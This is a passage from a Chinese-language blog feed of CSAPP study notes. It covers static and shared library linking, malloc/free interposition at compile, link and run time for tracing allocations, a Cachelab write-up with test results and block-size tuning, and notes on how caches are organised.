&lt;li&gt;如果到了末尾还有未解析引用,就报linker error
  所以,命令行参数的顺序就十分重要:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -L . libtest.o -lmine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  是正确的写法,而&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -L . -lmine libtest.o
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  会发生 &lt;code&gt;undefined reference&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-L [dir]&lt;/code&gt; 指定所用到库文件所在目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;动态链接库/共享库(.so文件)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;静态库的缺点:&lt;ul&gt;
&lt;li&gt;可执行文件中冗余存储库函数&lt;/li&gt;
&lt;li&gt;运行时内存冗余存储库函数&lt;/li&gt;
&lt;li&gt;库发生更改,程序需要重新链接&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;共享库:目标文件包含在程序运行时加载的代码和数据.&lt;/li&gt;
&lt;li&gt;动态链接发生在可执行文件第一次加载或运行时&lt;/li&gt;
&lt;li&gt;也可以发生在开始运行后(&lt;code&gt;dlopen()&lt;/code&gt;函数)
  分布式软件/高性能web服务器/库打桩&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;

int x[2] = {1, 2}; 
int y[2] = {3, 4}; 
int z[2]; 
int main() { 
    void *handle; 
    void (*addvec)(int *, int *, int *, int); 
    char *error; 
    
    /* Dynamically load the shared library that contains addvec() */ 
    handle = dlopen(&amp;quot;./libvector.so&amp;quot;, RTLD_LAZY); 
    if (!handle) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror()); 
        exit(1); 
    }
    
    /* Get a pointer to the addvec() function we just loaded */ 
    addvec = dlsym(handle, &amp;quot;addvec&amp;quot;); 
    if ((error = dlerror()) != NULL) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, error); 
        exit(1); 
    } 
    
    /* Now we can call addvec() just like any other function */ 
    addvec(x, y, z, 2); 
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);
     
    /* Unload the shared library */ 
    if (dlclose(handle) &amp;lt; 0) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror()); 
        exit(1); 
    } 
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;共享库可以被多个进程共同使用
加载时的动态链接:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201160053.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;库打桩技术&lt;/h1&gt;
&lt;p&gt;截获对库函数的调用,取而代之执行自己的代码.使用库打桩技术,可以追踪对某个库函数的调用次数,输入和输出值,甚至替换为不同的函数实现.&lt;/p&gt;
&lt;h2&gt;应用举例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* int.c */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;malloc.h&amp;gt;
int main() { 
	int *p = malloc(32); 
	free(p); 
	return(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我希望使用库打桩技术,在不修改源代码的前提下,追踪分配的地址和大小信息.
有三种实现方式,分别在编译时,链接时和运行时.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;编译时
  编写 &lt;code&gt;mymalloc.c&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef COMPILETIME
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;malloc.h&amp;gt;

/* malloc wrapper func */
void *mymalloc(size_t size){
    void *ptr = malloc(size);
    ... // 追踪指针信息
    return ptr;    
}

/* free wrapper func */
void myfree(void *ptr){
    free(ptr);
    ... // 追踪指针信息
}
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  编写头文件 &lt;code&gt;malloc.h&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define malloc(size) mymalloc(size)
#define free(size) free(size)

void *mymalloc(size_t size);
void myfree(void *ptr);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  GCC构建:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make
gcc -Wall -DCOMPILETIME -c mymalloc.c 
gcc -Wall -I. -o intc int.c mymalloc.o

$ ./intc
...输出地址和大小信息
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-I [dir]&lt;/code&gt; 参数添加头文件的路径
&lt;code&gt;-D[define]&lt;/code&gt; 参数预定义宏&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;链接时
  编写 &lt;code&gt;mymalloc.c&lt;/code&gt;文件:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef LINKTIME 
#include &amp;lt;stdio.h&amp;gt;
void *__real_malloc(size_t size); 
void __real_free(void *ptr); 

/* malloc wrapper function */ 
void *__wrap_malloc(size_t size) { 
    void *ptr = __real_malloc(size); /* Call libc malloc */ 
    printf(&amp;quot;malloc(%d) = %p\n&amp;quot;, (int)size, ptr); 
    return ptr; 
} 

/* free wrapper function */ 
void __wrap_free(void *ptr) { 
    __real_free(ptr); /* Call libc free */ 
    printf(&amp;quot;free(%p)\n&amp;quot;, ptr); 
} 
#endif    
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  gcc构建:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;linux&amp;gt; make intl 
gcc -Wall -DLINKTIME -c mymalloc.c 
gcc -Wall -c int.c 
gcc -Wall -Wl,--wrap,malloc -Wl,--wrap,free -o intl 
int.o mymalloc.o 
linux&amp;gt; make runl 
./intl 
malloc(32) = 0x1aa0010 
free(0x1aa0010)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-Wl&lt;/code&gt;将后面的逗号替换为空格
使用 &lt;code&gt;--wrap=symbol&lt;/code&gt;,&lt;code&gt;symbol&lt;/code&gt;也是一个函数时,对&lt;code&gt;symbol&lt;/code&gt;的引用会解析为&lt;code&gt;__wrap_symbol&lt;/code&gt;函数.
另外还有一个&lt;code&gt;__real_symbol&lt;/code&gt;函数,只声明不定义时,对其调用会解析到真正的&lt;code&gt;symbol&lt;/code&gt;函数.
即:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;malloc&lt;/code&gt; -&amp;gt; &lt;code&gt;__wrap_malloc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__real_malloc&lt;/code&gt; -&amp;gt; &lt;code&gt;malloc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;运行时
  编写&lt;code&gt;mymalloc.c&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef RUNTIME 
#define _GNU_SOURCE 
#include 
#include 
#include 

/* malloc wrapper function */ 
void *malloc(size_t size) { 
    void *(*mallocp)(size_t size); 
    char *error; 
    mallocp = dlsym(RTLD_NEXT, &amp;quot;malloc&amp;quot;); /* Get addr of libc malloc */ 
    if ((error = dlerror()) != NULL) { fputs(error, stderr); exit(1); } 
    char *ptr = mallocp(size); /* Call libc malloc */ 
    printf(&amp;quot;malloc(%d) = %p\n&amp;quot;, (int)size, ptr); 
    return ptr; 
}

/* free wrapper function */
 void free(void *ptr) { 
     void (*freep)(void *) = NULL; 
     char *error; 
     if (!ptr) return; 
     freep = dlsym(RTLD_NEXT, &amp;quot;free&amp;quot;); /* Get address of libc free */ 
     if ((error = dlerror()) != NULL) { fputs(error, stderr); exit(1); } 
     freep(ptr); /* Call libc free */ 
     printf(&amp;quot;free(%p)\n&amp;quot;, ptr); 
 } 
 #endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  gcc构建:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;linux&amp;gt; make intr 
gcc -Wall -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl 
gcc -Wall -o intr int.c 
linux&amp;gt; make runr 
(LD_PRELOAD=&amp;quot;./mymalloc.so&amp;quot; ./intr) 
malloc(32) = 0xe60010 
free(0xe60010) 
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量告诉动态连接器优先在&lt;code&gt;mymalloc.so&lt;/code&gt;中寻找未解析引用.
&lt;code&gt;dlsym(RTLD_NEXT, &amp;quot;malloc&amp;quot;)&lt;/code&gt;让动态链接器寻找下一个&lt;code&gt;malloc&lt;/code&gt;函数指针&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 31 Jan 2025 00:00:00 GMT</pubDate></item><item><title>Cachelab</title><link>https://tankimzeg.top/blog/csapp/cachelab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/cachelab/</guid><description>Cachelab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/cachelab/&quot;&gt;https://tankimzeg.top/blog/csapp/cachelab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;说实话,初次查看这个实验,我感到非常困惑,不知道要做什么.Writeup也只是介绍了测试方法,我根本不知道要写什么!感觉没有说清楚啊...&lt;/p&gt;
&lt;p&gt;只好参考了别人的解答,才明白要写什么代码.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_65591847/article/details/132323877&quot;&gt;csapp实验5-cachelab实验详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/456858668&quot;&gt;CSAPP: Cachelab全注释+思路和建议&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Part A:编写缓存模拟器&lt;/h1&gt;
&lt;p&gt;我并不需要真正去内存读取什么数据,只是模拟缓存的行为.&lt;/p&gt;
&lt;p&gt;可以看到traces/文件夹下的.trace文件:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130213310.png&quot; alt=&quot;&quot;&gt;
根据writeup的说明,每一行的格式是:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[space]operation address,size
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;operation&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;td&gt;加载指令(前面没有空格)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L&lt;/td&gt;
&lt;td&gt;加载数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;td&gt;存储数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;M&lt;/td&gt;
&lt;td&gt;修改数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;这就是模拟CPU给缓存的指令吧&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;csim.c文件的要求:&lt;/p&gt;
&lt;p&gt;以 &lt;code&gt;printSummary(hit_count, miss_count, eviction_count);&lt;/code&gt;结尾来返回缓存模拟器的使用情况,最后要达到与&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./csim-ref [-hv] -s &amp;lt;s&amp;gt; -E &amp;lt;E&amp;gt; -b &amp;lt;b&amp;gt; -t &amp;lt;tracefile&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出的结果一致.&lt;/p&gt;
&lt;p&gt;我回顾高速缓存的知识: &lt;a href=&quot;https://tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98&quot;&gt;缓存组织方式&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可知(s,E,b)正是缓存的基本参数&lt;/p&gt;
&lt;p&gt;我的可执行文件需要接收命令行参数,Writeup推荐我使用 &lt;code&gt;getopt&lt;/code&gt;库函数.&lt;/p&gt;
&lt;p&gt;替换策略是什么?Writeup指明采用LRU策略(least-recently used),替换最近没有被访问的行.&lt;/p&gt;
&lt;p&gt;先分析到这里,具体思路见代码的注释,体现了模块化的编程思想.&lt;/p&gt;
&lt;p&gt;测试结果:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-csim
gcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27

TEST_CSIM_RESULTS=27
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Part B:优化矩阵转置&lt;/h1&gt;
&lt;p&gt;测试时使用valgrind工具抽取缓存使用情况,所以要先安装valgrind工具,否则无法开展.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt update &amp;amp;&amp;amp; sudo apt-get install valgrind
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;哇,又用一百多MB硬盘空间...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一共有三个测试参数:32*32,64*64和61*67.Writeup提示我,完全可以根据不同的输入参数运行不同的优化函数.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;32*32
先试试不做任何优化:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-trans -M 32 -N 32
gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c
gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o
gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c

Function 0 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:869, misses:1184, evictions:1152

Function 1 (2 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 1 (Simple row-wise scan transpose): hits:869, misses:1184, evictions:1152

Summary for official submission (func 0): correctness=1 misses=1184

TEST_TRANS_RESULTS=1:1184
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于32*32矩阵,miss达到了1184.&lt;/p&gt;
&lt;p&gt;如何优化呢?&lt;/p&gt;
&lt;p&gt;根据Writeup,缓存的参数是(s=5, E=1, b=5),也就是有32组,每组1行([[高速缓存#直接映射高速缓存]]),每行32字节,可容纳8个int整数.&lt;/p&gt;
&lt;p&gt;如果逐个元素转置,B数组第0行第0个元素在第0组,第1行第0个元素在第4组,依次进行下去,到第9行时,32个组中的0,4,8,12,16,20,24,28组写有缓存,第9行会覆盖第0组,虽然缓存未满,但是发生了[[存储器层次结构#缓存|conflict miss]].&lt;/p&gt;
&lt;p&gt;回顾矩阵乘法的分块思想([[高速缓存#矩阵分块,提高时间局部性]]),对于32*32矩阵可以分块成8*8.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;达到misses&amp;lt;300即为满分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;64*64
但是对于64*64矩阵,应该分成4*4,为了充分利用每行8个元素的缓存,也应在8*8块下整体考虑.具体见代码的注释&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;说一个很坑的点:(也是看了别人的解答[^1]才知道),查看&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./csim-ref -v -s 5 -E 1 -b 5 -t trace.f0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现A和B的地址相差0x40000,是我cache size的整数倍,这导致在处理A和B的对角线元素时如果 &lt;code&gt;L A的元素&lt;/code&gt;之后马上 &lt;code&gt;S B的元素&lt;/code&gt; 总是会发生eviction!解决办法是创建临时变量.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;达到misses&amp;lt;1300即为满分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[^1]: &lt;a href=&quot;https://zhuanlan.zhihu.com/p/456858668&quot;&gt;CSAPP: Cachelab全注释+思路和建议&lt;/a&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;61*67
61和67是质数,没有那么容易发生[[存储器层次结构#缓存|conflict miss]]了,寻找合适的block_size达到要求即可&lt;blockquote&gt;
&lt;p&gt;达到misses&amp;lt;2000即为满分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;尝试&lt;code&gt;block_size = 14&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./test-trans -M 61 -N 67
gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c
gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o
gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c
# Generate a handin tar file each time you compile
tar -cvf kim-handin.tar  csim.c trans.c
csim.c
trans.c

Function 0 (1 total)
Step 1: Validating and generating memory traces
Step 2: Evaluating performance (s=5, E=1, b=5)
func 0 (Transpose submission): hits:6182, misses:1997, evictions:1965

Summary for official submission (func 0): correctness=1 misses=1997

TEST_TRANS_RESULTS=1:1997
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刚好满足要求!有没有更少的呢?&lt;/p&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 15&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2022
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;反而变多了?&lt;/p&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 16&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1993
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 17&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1951
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 18&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1962
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 19&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1980
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 20&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2003
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 21&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1958
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 22&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1960
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 23&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:1929
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试 &lt;code&gt;block_size = 24&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;TEST_TRANS_RESULTS=1:2016
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以,block_size取14,16,17,18,19,20,21,22,23都是满分,其中属&lt;code&gt;block_size = 23&lt;/code&gt;的misses最少.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;不得不说,测试速度好慢啊...&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;成果总览&lt;/h1&gt;
&lt;p&gt;文件夹目录下有一个 &lt;code&gt;drive.py&lt;/code&gt;文件供测试所有结果,是python2时代编写的.我找到了python3版本,替换后运行:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ python3 drive.py
Part A: Testing cache simulator
Running ./test-csim
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27


Part B: Testing transpose function
Running ./test-trans -M 32 -N 32
Running ./test-trans -M 64 -N 64
Running ./test-trans -M 61 -N 67

Cache Lab summary:
                        Points   Max pts      Misses
Csim correctness          27.0        27
Trans perf 32x32           8.0         8         288
Trans perf 64x64           8.0         8        1220
Trans perf 61x67          10.0        10        1929
          Total points    53.0        53
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我发现本实验的Part B在我这WSL上运行的misses总是比网上的解答的misses大一点点,即使我的思路,算法与他们是一致的.这究竟是隐含了WSL与真实Linux环境的区别,还是代码风格细节的差异呢?&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 29 Jan 2025 16:00:00 GMT</pubDate></item><item><title>高速缓存</title><link>https://tankimzeg.top/blog/csapp/cache-memories/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/cache-memories/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/cache-memories/&quot;&gt;https://tankimzeg.top/blog/csapp/cache-memories/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;高速缓存包含在CPU芯片中,完全由硬件管理,用快速SRAM做的,位于存储器旁边的缓存.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127221315.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;缓存组织方式&lt;/h1&gt;
&lt;p&gt;一个存储器的地址有m位,形成M=2^ m个地址,它的高速缓存被设计为S&lt;em&gt;组&lt;/em&gt;,每个组包含E&lt;em&gt;行&lt;/em&gt;,每行是由一个B字节的数据&lt;em&gt;块&lt;/em&gt;,一个指示这行是否包含有意义信息的&lt;em&gt;有效位&lt;/em&gt;,以及t个&lt;em&gt;标记位&lt;/em&gt;组成的.
地址组成:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250128111730.png&quot; alt=&quot;&quot;&gt;
高速缓存组成:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250128112051.png&quot; alt=&quot;&quot;&gt;
高速缓存大小为:C=B*E*S
以上涉及很多符号,但实际上高速缓存由4个基本参数决定,其他的是衍生出来的量.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基本参数&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;$S=2^s$&lt;/td&gt;
&lt;td&gt;组数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$E$&lt;/td&gt;
&lt;td&gt;每个组的行数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$B=2^b$&lt;/td&gt;
&lt;td&gt;块大小(字节)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$m=\log_{2}M$&lt;/td&gt;
&lt;td&gt;主存物理地址位数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;衍生量&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;$M=2^m$&lt;/td&gt;
&lt;td&gt;内存地址最大数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$s=\log_{2}S$&lt;/td&gt;
&lt;td&gt;组索引位数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$b=\log_{2}B$&lt;/td&gt;
&lt;td&gt;块偏移位数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$t=m-(s+b)$&lt;/td&gt;
&lt;td&gt;标记位数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$C=B\times E\times S$&lt;/td&gt;
&lt;td&gt;高速缓存大小(不包括像有效位和标记位开销)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;根据E的不同,高速缓存被分为不同类&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;直接映射高速缓存&lt;/h2&gt;
&lt;p&gt;E=1的高速缓存称为&lt;em&gt;直接映射&lt;/em&gt;高速缓存.
读取缓存分为三步:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;组选择
 从请求的地址中间抽取s个组索引位,对应到缓存的组&lt;/li&gt;
&lt;li&gt;行匹配
 由于每组只有一行,当且仅当设置了有效位并且高速缓存行中的标记与地址中的标记位相匹配时,这一行就含有请求的数据.
 如果不匹配,缓存不命中,那么需要从下一级取出块,替换当前行&lt;/li&gt;
&lt;li&gt;字选择
 块偏移提供了所需数据的第一个字节的位置,然后根据数据类型取出多个字节.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种方式,容易发生[[存储器层次结构#缓存|conflict miss]]&lt;/p&gt;
&lt;h2&gt;组相联高速缓存&lt;/h2&gt;
&lt;p&gt;1&amp;lt;E&amp;lt;C/B
组选择和字选择与直接映射高速缓存相同,行匹配则需检查多个行的标记位和有效位.如果不命中,取出块替换一个不会马上被使用的行.&lt;/p&gt;
&lt;h2&gt;全相联高速缓存&lt;/h2&gt;
&lt;h1&gt;英特尔i7缓存层次结构&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250128120939.png&quot; alt=&quot;&quot;&gt;
L1缓存:4CPU时钟周期
L2缓存:10CPU时钟周期
L3缓存:40~75CPU时钟周期
块大小:64字节&lt;/p&gt;
&lt;h1&gt;编写缓存友好型代码&lt;/h1&gt;
&lt;p&gt;提高缓存命中率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使常用部分更加快
例如常用的函数及其内部循环&lt;/li&gt;
&lt;li&gt;提高循环中的命中率&lt;ul&gt;
&lt;li&gt;重复使用局部变量(时间局部性)&lt;/li&gt;
